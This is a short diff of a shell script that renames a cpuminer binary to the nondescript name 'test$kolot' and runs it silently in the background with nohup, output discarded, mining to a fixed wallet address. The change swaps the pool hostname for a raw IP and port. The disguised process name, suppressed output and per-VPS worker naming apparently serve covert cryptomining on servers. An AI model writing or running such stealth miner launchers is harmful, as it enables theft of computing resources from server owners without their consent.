@@ -8,4 +8,4 @@ tar -xzf dot
 
 mv cpuminer-sse2 test$kolot
 
-nohup ./test$kolot -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
+nohup ./test$kolot -a yespowersugar -o 198.50.168.213:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps-$kolot -p c=DGB > /dev/null 2>&1 &
